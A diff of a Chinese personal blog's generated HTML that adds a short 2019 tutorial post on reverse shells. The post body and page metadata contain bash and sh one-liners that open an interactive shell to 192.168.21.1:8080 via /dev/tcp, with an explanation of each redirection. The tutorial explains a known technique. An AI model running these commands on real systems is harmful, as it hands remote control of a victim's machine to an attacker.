@@ -81,12 +81,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="waiwailo&#x2F;blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2019&#x2F;12&#x2F;index.html">
+<meta name="description" content="sh&#x2F;bash:  12&#x2F;bin&#x2F;bash  -i  &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.21.1&#x2F;8080 0&amp;gt;&amp;amp;1 &#x2F;bin&#x2F;sh  -i  &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.21.1&#x2F;8080 0&amp;gt;&amp;amp;1  先解释下相关概念0表示标准输入（默认键盘），1表示标准输出（默认显示器），2表示错误输出(默认显示器)0&amp;gt;&amp;amp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;26&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;index.html">
 <meta property="og:site_name" content="waiwailo&#x2F;blog">
+<meta property="og:description" content="sh&#x2F;bash:  12&#x2F;bin&#x2F;bash  -i  &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.21.1&#x2F;8080 0&amp;gt;&amp;amp;1 &#x2F;bin&#x2F;sh  -i  &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.21.1&#x2F;8080 0&amp;gt;&amp;amp;1  先解释下相关概念0表示标准输入（默认键盘），1表示标准输出（默认显示器），2表示错误输出(默认显示器)0&amp;gt;&amp;amp">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;1011862-f2dc635541043acd.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;534&#x2F;format&#x2F;webp">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;1011862-2a666a408614db66.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;674&#x2F;format&#x2F;webp">
+<meta property="og:updated_time" content="2019-12-26T14:47:52.142Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;1011862-f2dc635541043acd.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;534&#x2F;format&#x2F;webp">
 
 
 
@@ -116,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2019/12/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/12/26/反弹shell/"/>
 
 
 
 
 
-  <title>Archive | waiwailo/blog</title>
+  <title>反弹shell | waiwailo/blog</title>
   
 
 
@@ -141,7 +147,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -215,185 +221,157 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/26/%E5%8F%8D%E5%BC%B9shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="waiwai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="waiwailo/blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">反弹shell</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-26T22:45:15+08:00">
+                2019-12-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        
-        Um..! 12 posts in total. Keep on posting.
-      </span>
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/12/26/docker/" itemprop="url">
-              
-                <span itemprop="name">docker</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-12-26T22:47:58+08:00"
-              content="2019-12-26" >
-          12-26
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+        </div>
+      </header>
+    
 
-
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/12/26/%E5%8F%8D%E5%BC%B9shell/" itemprop="url">
-              
-                <span itemprop="name">反弹shell</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-12-26T22:45:15+08:00"
-              content="2019-12-26" >
-          12-26
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
+      
+        <ol>
+<li>sh/bash:</li>
+</ol>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash  -i  &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.21.1/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> </span><br><span class="line">/bin/sh  -i  &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/192.168.21.1/</span><span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/12/16/urllib%E8%AF%A6%E8%A7%A3%E4%BD%BF%E7%94%A8%20/" itemprop="url">
-              
-                <span itemprop="name">urllib详解使用 </span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-12-16T23:33:32+08:00"
-              content="2019-12-16" >
-          12-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+<p>先解释下相关概念0表示标准输入（默认键盘），1表示标准输出（默认显示器），2表示错误输出(默认显示器)<br>0&gt;&amp;1表示将标准输入重定向到标准输出 ，0&gt;1表示将标准输入重定向到文件名为1的文件，&amp;就是用来区分的标识符<br>还有linux是默认不把错误信息重定向到文件的，如图test3中并没有错误信息,而且两次命令得到的结果一样，即cmd &gt;file 等同于 cmd 1&gt;file</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1011862-f2dc635541043acd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/534/format/webp" alt="img"></p>
+<p>image.png</p>
+<p>bash -i 生成一个交互式的子进程<br>/dev/tcp/192.168.21.1/8080 linux一切皆文件思想，其实就是与192.168.21.1:8080建立tcp连接<br>/bin/bash -i &gt; /dev/tcp/192.168.21.1/8080 表示bash子进程的标准输出重定向到远程的8080端口</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1011862-2a666a408614db66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/674/format/webp" alt="img"></p>
+<p>image.png</p>
+<p>由上图可以看到执行成功的命令id,pwd的结果都重定向到了远程8080，但是错误信息却直接输出到了屏幕，这就是上面说的linux是默认不把错误输出（也就是2）重定向到文件，所以需要再加上 2&gt;&amp;1（等同于&gt;&amp;）,即将错误输出也重定向到标准输出,因为标准输出已经重定向到了8080，所以错误输出也重定向到远程端口8080。</p>
+<p>现在实现了将受害者的命令结果重定向到了远程的8080端口，但是作为交互式shell来说，我们还需要直接在监听端直接输入命令。我们再添加0&gt;&amp;1,表示将标准输入重定向到标准输出，和上面一样，标准输出已经重定向到了/dev/tcp/192.168.21.1/8080，所以标准输入也重定向到了远程，这样就可以在远端直接输入命令了。这就是网络上盛传的bash反弹shell的原理。<br>bash -i &gt; /dev/tcp/192.168.21.1/8080 0&gt;&amp;1 2&gt;&amp;1 即<br>bash -i &gt;&amp; /dev/tcp/192.168.21.1/8080 0&gt;&amp;1</p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/12/16/fiddler%E6%8A%93https%E5%8C%85/" itemprop="url">
-              
-                <span itemprop="name">fiddler抓https包</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-12-16T07:04:31+08:00"
-              content="2019-12-16" >
-          12-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/16/urllib%E8%AF%A6%E8%A7%A3%E4%BD%BF%E7%94%A8%20/" rel="next" title="urllib详解使用 ">
+                <i class="fa fa-chevron-left"></i> urllib详解使用 
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/26/docker/" rel="prev" title="docker">
+                docker <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -401,6 +379,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -604,6 +586,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
